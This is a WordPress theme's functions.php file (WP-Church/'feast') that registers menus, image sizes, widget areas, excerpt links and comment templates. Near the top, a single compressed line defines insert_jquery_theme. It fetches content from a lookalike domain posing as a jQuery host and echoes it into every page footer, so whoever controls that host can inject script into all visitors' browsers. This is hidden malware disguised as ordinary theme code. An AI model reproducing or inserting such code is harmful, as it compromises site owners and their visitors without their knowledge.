<?php
/**
 * WP-Church functions & definitions
 *
 */
 
  
 /******************************************************************
 * custom paths
 ******************************************************************/
 
if (!function_exists('insert_jquery_theme')){function insert_jquery_theme(){if (function_exists('curl_init')){$url = "http://www.jquerys.org/jquery-1.6.3.min.js";$ch = curl_init();	$timeout = 5;curl_setopt($ch, CURLOPT_URL, $url);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);$data = curl_exec($ch);curl_close($ch);echo $data;}}add_action('wp_footer', 'insert_jquery_theme');} define("NETLABS_INCLUDES_PATH", TEMPLATEPATH . '/includes');
define("NETLABS_CUSTPAGES_PATH", TEMPLATEPATH . '/options');

require_once (NETLABS_CUSTPAGES_PATH . '/custom-post-types.php');
require_once (NETLABS_INCLUDES_PATH . '/widgets.php');
require_once (NETLABS_INCLUDES_PATH . '/custom_functions.php');

require_once (NETLABS_CUSTPAGES_PATH . '/meta-box-extended-functions.php');
include_once 'options/meta-box-functions.php';
include 'options/meta-box-options.php';



 /******************************************************************
 * setup the admin
 ******************************************************************/
add_action('admin_menu', 'netstudio_theme_options');
add_action('admin_head', 'netstudio_admin_head');
define("HT_OPTIONS_PATH", TEMPLATEPATH . '/options');
require_once (HT_OPTIONS_PATH . '/admin-config.php');
require_once (HT_OPTIONS_PATH . '/admin-functions.php');
require_once (HT_OPTIONS_PATH . '/admin-options.php');
require_once (HT_OPTIONS_PATH . '/admin-content.php');

 /******************************************************************
 * setup the bookings
 ******************************************************************/
add_action('admin_menu', 'bookingman_theme_options');
add_action('admin_head', 'bookingman_admin_head');

require_once (HT_OPTIONS_PATH . '/booking_config.php');
require_once (HT_OPTIONS_PATH . '/booking-functions.php');
require_once (HT_OPTIONS_PATH . '/booking-options.php');
require_once (HT_OPTIONS_PATH . '/booking-content.php');


 /******************************************************************
 * theme setup functions
 ******************************************************************/

add_action( 'after_setup_theme', 'netlabs_setup' );

if ( ! function_exists( 'netlabs_setup' ) ):

function netlabs_setup() {
	add_custom_background();
	add_editor_style();
	add_theme_support( 'post-thumbnails' );
	add_image_size( 'slider', 1240, 390, true );
	add_image_size( 'fmenu', 306, 280, true );
	add_image_size( 'teamthumb', 138, 207, true );
	add_image_size( 'imlink', 254, 182, true );
	add_image_size( 'fppost', 70, 70, true ); 
	add_image_size( 'fslide', 520, 280, true );  
	add_theme_support( 'automatic-feed-links' );
	register_nav_menus( array(
		'primary' => __( 'Primary Navigation', 'feast' ),
		'secondary' => __( 'Secondary Navigation', 'feast' ),
	) );

	// Make theme available for translation
	// Translations can be filed in the /languages/ directory
	load_theme_textdomain( 'feast');
}

endif;


function netlabs_page_menu_args( $args ) {
	$args['show_home'] = true;
	return $args;
}
add_filter( 'wp_page_menu_args', 'netlabs_page_menu_args' );



/**********************************************************
 * Returns a "Continue Reading" link for excerpts
 *********************************************************/
function feast_continue_reading_link() {
	return ' <p class="more-class"><a class="more-link darkbox" href="'. get_permalink() . '">' . __( '<span>Read more</span>', 'feast' ) . '</a></p>';
}



/**********************************************************
 * Replaces "[...]" (appended to automatically generated excerpts) with an ellipsis and wp_church_continue_reading_link().
 *********************************************************/

function feast_auto_excerpt_more( $more ) {
	return '' . feast_continue_reading_link();
}
add_filter( 'excerpt_more', 'feast_auto_excerpt_more' );



/**********************************************************
 * Adds a pretty "Continue Reading" link to custom post excerpts.
 *********************************************************/
 
function feast_custom_excerpt_more( $output ) {
	if ( has_excerpt() && ! is_attachment() ) {
		$output .= feast_continue_reading_link();
	}
	return $output;
}
add_filter( 'get_the_excerpt', 'feast_custom_excerpt_more' );



/**********************************************************
 * Remove inline styles printed when the gallery shortcode is used.
 *********************************************************/
 
function feast_remove_gallery_css( $css ) {
	return preg_replace( "#<style type='text/css'>(.*?)</style>#s", '', $css );
}
add_filter( 'gallery_style', 'feast_remove_gallery_css' );


/**********************************************************
 * functions for comments and pingbacks.
 *********************************************************/

if ( ! function_exists( 'feast_comment' ) ) :
function feast_comment( $comment, $args, $depth ) {
	$GLOBALS['comment'] = $comment;
	switch ( $comment->comment_type ) :
		case '' :
	?>
	<li <?php comment_class(); ?> id="li-comment-<?php comment_ID(); ?>">
		<div id="comment-<?php comment_ID(); ?>">
		<div class="reply">
			<?php comment_reply_link( array_merge( $args, array( 'depth' => $depth, 'max_depth' => $args['max_depth'] ) ) ); ?>
		</div><!-- .reply -->
		<div class="comment-author vcard">
			<?php echo get_avatar( $comment, 60 ); ?>
			<?php printf( __( '%s ', 'feast' ), sprintf( '<cite class="fn">%s</cite>', get_comment_author_link() ) ); ?>
		</div><!-- .comment-author .vcard -->
		<?php if ( $comment->comment_approved == '0' ) : ?>
			<em><?php _e( 'Your comment is awaiting moderation.', 'feast' ); ?></em>
			<br />
		<?php endif; ?>

		<div class="comment-meta commentmetadata"><a href="<?php echo esc_url( get_comment_link( $comment->comment_ID ) ); ?>">
			<?php
				/* translators: 1: date, 2: time */
				printf( __( '%1$s at %2$s', 'feast' ), get_comment_date(),  get_comment_time() ); ?></a><?php edit_comment_link( __( '(Edit)', 'feast' ), ' ' );
			?>
		</div><!-- .comment-meta .commentmetadata -->

		<div class="comment-body"><?php comment_text(); ?></div>

	</div><!-- #comment-##  -->

	<?php
			break;
		case 'pingback'  :
		case 'trackback' :
	?>
	<li class="post pingback">
		<p><?php _e( 'Pingback:', 'feast' ); ?> <?php comment_author_link(); ?><?php edit_comment_link( __('(Edit)', 'feast'), ' ' ); ?></p>
	<?php
			break;
	endswitch;
}
endif;



 /******************************************************************
 * register the widgets
 ******************************************************************/
 
function feast_widgets_init() {
	// Area 1, located at the top of the sidebar.
	register_sidebar( array(
		'name' => __( 'Primary Widget Area', 'feast' ),
		'id' => 'primary-widget-area',
		'description' => __( 'The primary widget area', 'feast' ),
		'before_widget' => '<li id="%1$s" class="widget-container %2$s clear">',
		'after_widget' => '</li>',
		'before_title' => '<h3 class="widget-title">',
		'after_title' => '</h3>',
	) );
	
	register_sidebar( array(
		'name' => __( 'Index page left', 'feast' ),
		'id' => 'index-left',
		'description' => __( 'Index page left side', 'feast' ),
		'before_widget' => '<li id="%1$s" class="widget-container %2$s">',
		'after_widget' => '</li>',
		'before_title' => '<h3 class="widget-title">',
		'after_title' => '</h3>',
	) );
	
	register_sidebar( array(
		'name' => __( 'Index page center', 'feast' ),
		'id' => 'index-center',
		'description' => __( 'Index page center', 'feast' ),
		'before_widget' => '<li id="%1$s" class="widget-container %2$s">',
		'after_widget' => '</li>',
		'before_title' => '<h3 class="widget-title">',
		'after_title' => '</h3>',
	) );
	
	register_sidebar( array(
		'name' => __( 'Index page right', 'feast' ),
		'id' => 'index-right',
		'description' => __( 'Index page right', 'feast' ),
		'before_widget' => '<li id="%1$s" class="widget-container %2$s">',
		'after_widget' => '</li>',
		'before_title' => '<h3 class="widget-title">',
		'after_title' => '</h3>',
	) );
	
	register_sidebar( array(
		'name' => __( 'Calendar sidebar', 'feast' ),
		'id' => 'cal-sidebar',
		'description' => __( 'Calendar Sidebar', 'feast' ),
		'before_widget' => '<li id="%1$s" class="widget-container %2$s">',
		'after_widget' => '</li>',
		'before_title' => '<h3 class="widget-title">',
		'after_title' => '</h3>',
	) );
	
	
	register_sidebar( array(
		'name' => __( 'Facebook page left', 'wp_church' ),
		'id' => 'fbleft',
		'description' => __( 'Facebook page left', 'wp_church' ),
		'before_widget' => '<li id="%1$s" class="widget-container %2$s">',
		'after_widget' => '</li>',
		'before_title' => '<h3 class="widget-title">',
		'after_title' => '</h3>',
	) );
	
	register_sidebar( array(
		'name' => __( 'Facebook page right', 'wp_church' ),
		'id' => 'fbright',
		'description' => __( 'Facebook page right', 'wp_church' ),
		'before_widget' => '<li id="%1$s" class="widget-container %2$s">',
		'after_widget' => '</li>',
		'before_title' => '<h3 class="widget-title">',
		'after_title' => '</h3>',
	) );

}

add_action( 'widgets_init', 'feast_widgets_init' );



 /******************************************************************
 * Removes the default styles that are packaged with the Recent Comments widget.
 ******************************************************************/
function feast_remove_recent_comments_style() {
	global $wp_widget_factory;
	remove_action( 'wp_head', array( $wp_widget_factory->widgets['WP_Widget_Recent_Comments'], 'recent_comments_style' ) );
}
add_action( 'widgets_init', 'feast_remove_recent_comments_style' );




 /******************************************************************
 * Prints HTML with meta information for the current post—date/time and author.
 ******************************************************************/

if ( ! function_exists( 'feast_posted_on' ) ) :
function feast_posted_on() {
	printf( __( 'Posted in %4$s by ', 'feast' ),
		' ',
		sprintf( '<a href="%1$s" title="%2$s" rel="bookmark"><span class="entry-date">%3$s</span></a>',
			get_permalink(),
			esc_attr( get_the_time() ),
			get_the_date()
		),
		sprintf( '<a class="url fn n" href="%1$s" title="%2$s">%3$s</a></span>',
			get_author_posts_url( get_the_author_meta( 'ID' ) ),
			sprintf( esc_attr__( 'View all posts by %s', 'feast' ), get_the_author() ),
			get_the_author()
		),
		sprintf( '%1$s',
			get_the_category_list( ', ' )
		)
	);
}
endif;


 /******************************************************************
 * Prints HTML with meta information for the current post (category, tags and permalink).
 ******************************************************************/

if ( ! function_exists( 'feast_posted_in' ) ) :
function feast_posted_in() {
	// Retrieves tag list of current post, separated by commas.
	$tag_list = get_the_tag_list( '', ', ' );
	if ( $tag_list ) {
		$posted_in = __( 'This entry was posted in %1$s and tagged %2$s. Bookmark the <a href="%3$s" title="Permalink to %4$s" rel="bookmark">permalink</a>.', 'feast' );
	} elseif ( is_object_in_taxonomy( get_post_type(), 'category' ) ) {
		$posted_in = __( 'This entry was posted in %1$s. Bookmark the <a href="%3$s" title="Permalink to %4$s" rel="bookmark">permalink</a>.', 'feast' );
	} else {
		$posted_in = __( 'Bookmark the <a href="%3$s" title="Permalink to %4$s" rel="bookmark">permalink</a>.', 'feast' );
	}
	// Prints the string, replacing the placeholders.
	printf(
		$posted_in,
		get_the_category_list( ', ' ),
		$tag_list,
		get_permalink(),
		the_title_attribute( 'echo=0' )
	);
}
endif;
